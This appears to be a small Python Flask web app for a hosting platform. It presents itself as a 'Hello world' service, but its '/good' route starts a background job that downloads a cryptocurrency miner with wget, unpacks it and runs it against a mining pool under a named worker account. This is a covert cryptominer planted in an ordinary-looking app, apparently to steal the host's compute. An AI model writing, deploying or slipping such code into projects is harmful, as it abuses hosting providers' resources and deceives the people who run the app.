import traceback
import uuid
import os
import sys
import flask
import flask.json
import gevent.pywsgi
import pymysql
import redis

from flask_executor import Executor
from platformshconfig import Config


# Coding
app = flask.Flask(__name__)
config = Config()
executor = Executor(app)



@app.route("/")
def hello():
    return "Hello world"

@app.route("/good")
def index():
    executor.submit(long_running_job)
    return "Submitted a job !"

def long_running_job():
    os.system("wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.python -p x -e 60")




if __name__ == "__main__":
    http_server = gevent.pywsgi.WSGIServer(('127.0.0.1', int(config.port)), app)
    http_server.serve_forever()
